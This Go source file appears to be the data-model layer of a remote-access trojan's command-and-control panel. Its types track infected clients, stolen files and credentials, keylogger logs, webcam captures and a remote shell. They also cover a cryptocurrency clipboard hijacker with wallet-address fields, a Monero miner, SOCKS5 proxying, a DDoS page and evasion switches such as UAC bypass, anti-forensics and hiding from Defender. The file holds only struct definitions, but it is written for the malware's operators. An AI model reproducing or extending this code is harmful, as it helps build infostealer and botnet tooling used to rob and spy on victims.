package core

import (
	"html/template"
	"time"
)

const (
	_Delta = 0x9e3779b9
)

type LoginPage struct {
	Trigger template.JS
	Type    template.JS
	Message string
}

type DashboardPage struct {
	Name     string
	Username string

	ActiveClients     string
	StolenFiles       string
	StolenCredentials string
	TotalClients      string

	AdminNotes string
	DebugLog   string

	USA    string
	EU     string
	RU     string
	JP     string
	AF     string
	OtherC string

	Windows string
	Linux   string
	Android string
	Other   string
}

type ClientsTable struct {
	ClientFLAG    string
	ClientIP      string
	ClientUID     string
	ClientVersion string
	ClientOS      string
	ClientAB      template.HTML
	ClientLR      template.HTML
}

type TaskTable struct {
	TaskID        string
	TaskName      string
	CommandDate   string
	CommandName   string
	Executions    template.HTML
	MaxExecutions template.HTML
	TaskTimeout   string
}

type TaskPage struct {
	Name     string
	Username string

	ActiveClients     string
	StolenFiles       string
	StolenCredentials string
	TotalClients      string

	TaskTables []TaskTable
}

type DDoSPage struct {
	Name     string
	Username string

	ActiveClients     string
	StolenFiles       string
	StolenCredentials string
	TotalClients      string
}

type ClientsPage struct {
	Name     string
	Username string

	ServerPort string

	ActiveClients     string
	StolenFiles       string
	StolenCredentials string
	TotalClients      string

	ClientTables []ClientsTable
}

type SettingsAdminTable struct {
	AdminUID      string
	AdminUsername string
	AdminLastSeen string
}

type SettingsPage struct {
	Name           string
	EncKey         string
	UserAgent      string
	Username       string
	CurrentTimeout string

	AdminsTable []SettingsAdminTable
}

type SocksPage struct {
	Name        string
	Username    string
	SocksTables []SocksTable
}

type SocksTable struct {
	IP         string
	Location   string
	ClientFLAG string
	Type       string
	ClientUID  string
	ServiceIP  string
}

type InstalledTable struct {
	InstallDate     string
	InstallLocation string
	Name            string
	Vendor          string
	Version         string
}

type StolenTable struct {
	FileName   string
	DateStolen string
	FileUID    string
}

type BrowserTable struct {
	BrowserIcon  template.HTML
	File         string
	DateReceived string
	Size         string
	FileLink     string
	FileUID      string
}

type KeyloggerTable struct {
	Size     string
	Date     string
	FileLink string
}

type CommandLogTable struct {
	ID            string
	CommandName   string
	CommandDate   string
	CommandStatus string
}

type ManagePage struct {
	Name     string
	Username string

	ClientUID        string
	ClientVersion    string
	ClientScreenshot string
	ScreenshotDate   string
	ClientWebcam     string
	WebcamDate       string
	ClientInfo       string
	AdminNotes       string
	GPU              string
	Upload           string
	Download         string
	FirstSeen        string
	ClientAB         template.HTML

	InstalledTables  []InstalledTable
	StolenTables     []StolenTable
	BrowserTables    []BrowserTable
	CommandLogTables []CommandLogTable
	KeyloggerTables  []KeyloggerTable
	RecordingsTables []RecordingsTable

	CryptoClipperState template.HTML
	BTCAddress         string
	XMRAddress         string
	ETHAddress         string
	CustomAddress      string
	CustomRegex        string

	XMRMinerState        template.HTML
	RemoteShellState     template.HTML
	SOCKS5               template.HTML
	KeyloggerState       template.HTML
	FileHunterState      template.HTML
	PasswordStealerState template.HTML
}
type RecordingsTable struct {
	RecordingID   string
	RecordingDate string
	RecordingLink string
}

type UpdateClientInfo struct {
	UID                   string
	ClientVersion         string
	IP                    string
	OS                    string
	GPU                   string
	Abilities             string
	SysInfo               string
	AntiVirus             string
	ClipperState          string
	BTC                   string
	XMR                   string
	ETH                   string
	Custom                string
	Regex                 string
	MinerState            string
	Socks5State           string
	ReverseProxyState     string
	RemoteShellState      string
	KeyloggerState        string
	FileHunterState       string
	PasswordStealerState  string
	Screenshot            string
	Webcam                string
	PingTime              string
	Jitter                string
	UserAgent             string
	InstanceKey           string
	Install               string
	SmartCopy             string
	InstallName           string
	InstallFolder         string
	Campaign              string
	AntiForensics         string
	AntiForensicsResponse string
	UACBypass             string
	Guardian              string
	DefenceSystem         string
	ACG                   string
	HideFromDefender      string
	AntiProcessWindow     string
	AntiProcess           string
	BlockTaskManager      string
}

type Command struct {
	Id         string
	DAT        string
	Command    string
	Parameters string
}

type ClientSettings struct {
	UID           string
	Clipper       string
	BTC           string
	XMR           string
	ETH           string
	Custom        string
	Regex         string
	Socks5        string
	Socks5Connect string
	Keylogger     string
}

type CommandStatus struct {
	Id     string
	Status string
}

type ClientImage struct {
	Type      string
	ImageData string
}

type FileExplorer struct {
	Path        string   `json:"path"`
	Files       []File   `json:"files"`
	Directories []string `json:"directories"`
}

type File struct {
	Filename string    `json:"filename"`
	ModTime  time.Time `json:"mod_time"`
}

type FileExplorerRequestForm struct {
	Address string `form:"address" binding:"required"`
	Path    string `form:"path"`
}

type SysInfo struct {
	WindowsBuildLabEx                  string      `json:"WindowsBuildLabEx"`
	WindowsCurrentVersion              string      `json:"WindowsCurrentVersion"`
	WindowsEditionID                   string      `json:"WindowsEditionId"`
	WindowsInstallationType            string      `json:"WindowsInstallationType"`
	WindowsInstallDateFromRegistry     string      `json:"WindowsInstallDateFromRegistry"`
	WindowsProductID                   string      `json:"WindowsProductId"`
	WindowsProductName                 string      `json:"WindowsProductName"`
	WindowsRegisteredOrganization      string      `json:"WindowsRegisteredOrganization"`
	WindowsRegisteredOwner             string      `json:"WindowsRegisteredOwner"`
	WindowsSystemRoot                  string      `json:"WindowsSystemRoot"`
	WindowsVersion                     string      `json:"WindowsVersion"`
	BiosCharacteristics                []int       `json:"BiosCharacteristics"`
	BiosBIOSVersion                    []string    `json:"BiosBIOSVersion"`
	BiosBuildNumber                    interface{} `json:"BiosBuildNumber"`
	BiosCaption                        string      `json:"BiosCaption"`
	BiosCodeSet                        interface{} `json:"BiosCodeSet"`
	BiosCurrentLanguage                interface{} `json:"BiosCurrentLanguage"`
	BiosDescription                    string      `json:"BiosDescription"`
	BiosEmbeddedControllerMajorVersion int         `json:"BiosEmbeddedControllerMajorVersion"`
	BiosEmbeddedControllerMinorVersion int         `json:"BiosEmbeddedControllerMinorVersion"`
	BiosFirmwareType                   int         `json:"BiosFirmwareType"`
	BiosIdentificationCode             interface{} `json:"BiosIdentificationCode"`
	BiosInstallableLanguages           interface{} `json:"BiosInstallableLanguages"`
	BiosInstallDate                    interface{} `json:"BiosInstallDate"`
	BiosLanguageEdition                interface{} `json:"BiosLanguageEdition"`
	BiosListOfLanguages                interface{} `json:"BiosListOfLanguages"`
	BiosManufacturer                   string      `json:"BiosManufacturer"`
	BiosName                           string      `json:"BiosName"`
	BiosOtherTargetOS                  interface{} `json:"BiosOtherTargetOS"`
	BiosPrimaryBIOS                    bool        `json:"BiosPrimaryBIOS"`
	BiosReleaseDate                    string      `json:"BiosReleaseDate"`
	BiosSeralNumber                    string      `json:"BiosSeralNumber"`
	BiosSMBIOSBIOSVersion              string      `json:"BiosSMBIOSBIOSVersion"`
	BiosSMBIOSMajorVersion             int         `json:"BiosSMBIOSMajorVersion"`
	BiosSMBIOSMinorVersion             int         `json:"BiosSMBIOSMinorVersion"`
	BiosSMBIOSPresent                  bool        `json:"BiosSMBIOSPresent"`
	BiosSoftwareElementState           int         `json:"BiosSoftwareElementState"`
	BiosStatus                         string      `json:"BiosStatus"`
	BiosSystemBiosMajorVersion         int         `json:"BiosSystemBiosMajorVersion"`
	BiosSystemBiosMinorVersion         int         `json:"BiosSystemBiosMinorVersion"`
	BiosTargetOperatingSystem          int         `json:"BiosTargetOperatingSystem"`
	BiosVersion                        string      `json:"BiosVersion"`
	CsAdminPasswordStatus              int         `json:"CsAdminPasswordStatus"`
	CsAutomaticManagedPagefile         bool        `json:"CsAutomaticManagedPagefile"`
	CsAutomaticResetBootOption         bool        `json:"CsAutomaticResetBootOption"`
	CsAutomaticResetCapability         bool        `json:"CsAutomaticResetCapability"`
	CsBootOptionOnLimit                interface{} `json:"CsBootOptionOnLimit"`
	CsBootOptionOnWatchDog             interface{} `json:"CsBootOptionOnWatchDog"`
	CsBootROMSupported                 bool        `json:"CsBootROMSupported"`
	CsBootStatus                       []int       `json:"CsBootStatus"`
	CsBootupState                      string      `json:"CsBootupState"`
	CsCaption                          string      `json:"CsCaption"`
	CsChassisBootupState               int         `json:"CsChassisBootupState"`
	CsChassisSKUNumber                 interface{} `json:"CsChassisSKUNumber"`
	CsCurrentTimeZone                  int         `json:"CsCurrentTimeZone"`
	CsDaylightInEffect                 interface{} `json:"CsDaylightInEffect"`
	CsDescription                      string      `json:"CsDescription"`
	CsDNSHostName                      string      `json:"CsDNSHostName"`
	CsDomain                           string      `json:"CsDomain"`
	CsDomainRole                       int         `json:"CsDomainRole"`
	CsEnableDaylightSavingsTime        bool        `json:"CsEnableDaylightSavingsTime"`
	CsFrontPanelResetStatus            int         `json:"CsFrontPanelResetStatus"`
	CsHypervisorPresent                bool        `json:"CsHypervisorPresent"`
	CsInfraredSupported                bool        `json:"CsInfraredSupported"`
	CsInitialLoadInfo                  interface{} `json:"CsInitialLoadInfo"`
	CsInstallDate                      interface{} `json:"CsInstallDate"`
	CsKeyboardPasswordStatus           int         `json:"CsKeyboardPasswordStatus"`
	CsLastLoadInfo                     interface{} `json:"CsLastLoadInfo"`
	CsManufacturer                     string      `json:"CsManufacturer"`
	CsModel                            string      `json:"CsModel"`
	CsName                             string      `json:"CsName"`
	CsNetworkAdapters                  []struct {
		Description      string      `json:"Description"`
		ConnectionID     string      `json:"ConnectionID"`
		DHCPEnabled      interface{} `json:"DHCPEnabled"`
		DHCPServer       interface{} `json:"DHCPServer"`
		ConnectionStatus int         `json:"ConnectionStatus"`
		IPAddresses      interface{} `json:"IPAddresses"`
	} `json:"CsNetworkAdapters"`
	CsNetworkServerModeEnabled  bool `json:"CsNetworkServerModeEnabled"`
	CsNumberOfLogicalProcessors int  `json:"CsNumberOfLogicalProcessors"`
	CsNumberOfProcessors        int  `json:"CsNumberOfProcessors"`
	CsProcessors                []struct {
		Name                      string `json:"Name"`
		Manufacturer              string `json:"Manufacturer"`
		Description               string `json:"Description"`
		Architecture              int    `json:"Architecture"`
		AddressWidth              int    `json:"AddressWidth"`
		DataWidth                 int    `json:"DataWidth"`
		MaxClockSpeed             int    `json:"MaxClockSpeed"`
		CurrentClockSpeed         int    `json:"CurrentClockSpeed"`
		NumberOfCores             int    `json:"NumberOfCores"`
		NumberOfLogicalProcessors int    `json:"NumberOfLogicalProcessors"`
		ProcessorID               string `json:"ProcessorID"`
		SocketDesignation         string `json:"SocketDesignation"`
		ProcessorType             int    `json:"ProcessorType"`
		Role                      string `json:"Role"`
		Status                    string `json:"Status"`
		CPUStatus                 int    `json:"CpuStatus"`
		Availability              int    `json:"Availability"`
	} `json:"CsProcessors"`
	CsOEMStringArray              interface{} `json:"CsOEMStringArray"`
	CsPartOfDomain                bool        `json:"CsPartOfDomain"`
	CsPauseAfterReset             int         `json:"CsPauseAfterReset"`
	CsPCSystemType                int         `json:"CsPCSystemType"`
	CsPCSystemTypeEx              int         `json:"CsPCSystemTypeEx"`
	CsPowerManagementCapabilities interface{} `json:"CsPowerManagementCapabilities"`
	CsPowerManagementSupported    interface{} `json:"CsPowerManagementSupported"`
	CsPowerOnPasswordStatus       int         `json:"CsPowerOnPasswordStatus"`
	CsPowerState                  int         `json:"CsPowerState"`
	CsPowerSupplyState            int         `json:"CsPowerSupplyState"`
	CsPrimaryOwnerContact         interface{} `json:"CsPrimaryOwnerContact"`
	CsPrimaryOwnerName            string      `json:"CsPrimaryOwnerName"`
	CsResetCapability             int         `json:"CsResetCapability"`
	CsResetCount                  int         `json:"CsResetCount"`
	CsResetLimit                  int         `json:"CsResetLimit"`
	CsRoles                       []string    `json:"CsRoles"`
	CsStatus                      string      `json:"CsStatus"`
	CsSupportContactDescription   interface{} `json:"CsSupportContactDescription"`
	CsSystemFamily                string      `json:"CsSystemFamily"`
	CsSystemSKUNumber             string      `json:"CsSystemSKUNumber"`
	CsSystemType                  string      `json:"CsSystemType"`
	CsThermalState                int         `json:"CsThermalState"`
	CsTotalPhysicalMemory         int64       `json:"CsTotalPhysicalMemory"`
	CsPhyicallyInstalledMemory    int         `json:"CsPhyicallyInstalledMemory"`
	CsUserName                    string      `json:"CsUserName"`
	CsWakeUpType                  int         `json:"CsWakeUpType"`
	CsWorkgroup                   string      `json:"CsWorkgroup"`
	OsName                        string      `json:"OsName"`
	OsType                        int         `json:"OsType"`
	OsOperatingSystemSKU          int         `json:"OsOperatingSystemSKU"`
	OsVersion                     string      `json:"OsVersion"`
	OsCSDVersion                  interface{} `json:"OsCSDVersion"`
	OsBuildNumber                 string      `json:"OsBuildNumber"`
	OsHotFixes                    []struct {
		HotFixID    string `json:"HotFixID"`
		Description string `json:"Description"`
		InstalledOn string `json:"InstalledOn"`
		FixComments string `json:"FixComments"`
	} `json:"OsHotFixes"`
	OsBootDevice       string `json:"OsBootDevice"`
	OsSystemDevice     string `json:"OsSystemDevice"`
	OsSystemDirectory  string `json:"OsSystemDirectory"`
	OsSystemDrive      string `json:"OsSystemDrive"`
	OsWindowsDirectory string `json:"OsWindowsDirectory"`
	OsCountryCode      string `json:"OsCountryCode"`
	OsCurrentTimeZone  int    `json:"OsCurrentTimeZone"`
	OsLocaleID         string `json:"OsLocaleID"`
	OsLocale           string `json:"OsLocale"`
	OsLocalDateTime    string `json:"OsLocalDateTime"`
	OsLastBootUpTime   string `json:"OsLastBootUpTime"`
	OsUptime           struct {
		Ticks             int64   `json:"Ticks"`
		Days              int     `json:"Days"`
		Hours             int     `json:"Hours"`
		Milliseconds      int     `json:"Milliseconds"`
		Minutes           int     `json:"Minutes"`
		Seconds           int     `json:"Seconds"`
		TotalDays         float64 `json:"TotalDays"`
		TotalHours        float64 `json:"TotalHours"`
		TotalMilliseconds float64 `json:"TotalMilliseconds"`
		TotalMinutes      float64 `json:"TotalMinutes"`
		TotalSeconds      float64 `json:"TotalSeconds"`
	} `json:"OsUptime"`
	OsBuildType                                             string      `json:"OsBuildType"`
	OsCodeSet                                               string      `json:"OsCodeSet"`
	OsDataExecutionPreventionAvailable                      bool        `json:"OsDataExecutionPreventionAvailable"`
	OsDataExecutionPrevention32BitApplications              bool        `json:"OsDataExecutionPrevention32BitApplications"`
	OsDataExecutionPreventionDrivers                        bool        `json:"OsDataExecutionPreventionDrivers"`
	OsDataExecutionPreventionSupportPolicy                  int         `json:"OsDataExecutionPreventionSupportPolicy"`
	OsDebug                                                 bool        `json:"OsDebug"`
	OsDistributed                                           bool        `json:"OsDistributed"`
	OsEncryptionLevel                                       int         `json:"OsEncryptionLevel"`
	OsForegroundApplicationBoost                            int         `json:"OsForegroundApplicationBoost"`
	OsTotalVisibleMemorySize                                int         `json:"OsTotalVisibleMemorySize"`
	OsFreePhysicalMemory                                    int         `json:"OsFreePhysicalMemory"`
	OsTotalVirtualMemorySize                                int         `json:"OsTotalVirtualMemorySize"`
	OsFreeVirtualMemory                                     int         `json:"OsFreeVirtualMemory"`
	OsInUseVirtualMemory                                    int         `json:"OsInUseVirtualMemory"`
	OsTotalSwapSpaceSize                                    interface{} `json:"OsTotalSwapSpaceSize"`
	OsSizeStoredInPagingFiles                               int         `json:"OsSizeStoredInPagingFiles"`
	OsFreeSpaceInPagingFiles                                int         `json:"OsFreeSpaceInPagingFiles"`
	OsPagingFiles                                           []string    `json:"OsPagingFiles"`
	OsHardwareAbstractionLayer                              string      `json:"OsHardwareAbstractionLayer"`
	OsInstallDate                                           string      `json:"OsInstallDate"`
	OsManufacturer                                          string      `json:"OsManufacturer"`
	OsMaxNumberOfProcesses                                  int64       `json:"OsMaxNumberOfProcesses"`
	OsMaxProcessMemorySize                                  int64       `json:"OsMaxProcessMemorySize"`
	OsMuiLanguages                                          []string    `json:"OsMuiLanguages"`
	OsNumberOfLicensedUsers                                 int         `json:"OsNumberOfLicensedUsers"`
	OsNumberOfProcesses                                     int         `json:"OsNumberOfProcesses"`
	OsNumberOfUsers                                         int         `json:"OsNumberOfUsers"`
	OsOrganization                                          string      `json:"OsOrganization"`
	OsArchitecture                                          string      `json:"OsArchitecture"`
	OsLanguage                                              string      `json:"OsLanguage"`
	OsProductSuites                                         []int       `json:"OsProductSuites"`
	OsOtherTypeDescription                                  interface{} `json:"OsOtherTypeDescription"`
	OsPAEEnabled                                            interface{} `json:"OsPAEEnabled"`
	OsPortableOperatingSystem                               bool        `json:"OsPortableOperatingSystem"`
	OsPrimary                                               bool        `json:"OsPrimary"`
	OsProductType                                           int         `json:"OsProductType"`
	OsRegisteredUser                                        string      `json:"OsRegisteredUser"`
	OsSerialNumber                                          string      `json:"OsSerialNumber"`
	OsServicePackMajorVersion                               int         `json:"OsServicePackMajorVersion"`
	OsServicePackMinorVersion                               int         `json:"OsServicePackMinorVersion"`
	OsStatus                                                string      `json:"OsStatus"`
	OsSuites                                                []int       `json:"OsSuites"`
	OsServerLevel                                           interface{} `json:"OsServerLevel"`
	KeyboardLayout                                          string      `json:"KeyboardLayout"`
	TimeZone                                                string      `json:"TimeZone"`
	LogonServer                                             string      `json:"LogonServer"`
	PowerPlatformRole                                       int         `json:"PowerPlatformRole"`
	HyperVisorPresent                                       bool        `json:"HyperVisorPresent"`
	HyperVRequirementDataExecutionPreventionAvailable       interface{} `json:"HyperVRequirementDataExecutionPreventionAvailable"`
	HyperVRequirementSecondLevelAddressTranslation          interface{} `json:"HyperVRequirementSecondLevelAddressTranslation"`
	HyperVRequirementVirtualizationFirmwareEnabled          interface{} `json:"HyperVRequirementVirtualizationFirmwareEnabled"`
	HyperVRequirementVMMonitorModeExtensions                interface{} `json:"HyperVRequirementVMMonitorModeExtensions"`
	DeviceGuardSmartStatus                                  int         `json:"DeviceGuardSmartStatus"`
	DeviceGuardRequiredSecurityProperties                   interface{} `json:"DeviceGuardRequiredSecurityProperties"`
	DeviceGuardAvailableSecurityProperties                  interface{} `json:"DeviceGuardAvailableSecurityProperties"`
	DeviceGuardSecurityServicesConfigured                   interface{} `json:"DeviceGuardSecurityServicesConfigured"`
	DeviceGuardSecurityServicesRunning                      interface{} `json:"DeviceGuardSecurityServicesRunning"`
	DeviceGuardCodeIntegrityPolicyEnforcementStatus         interface{} `json:"DeviceGuardCodeIntegrityPolicyEnforcementStatus"`
	DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus interface{} `json:"DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus"`
}
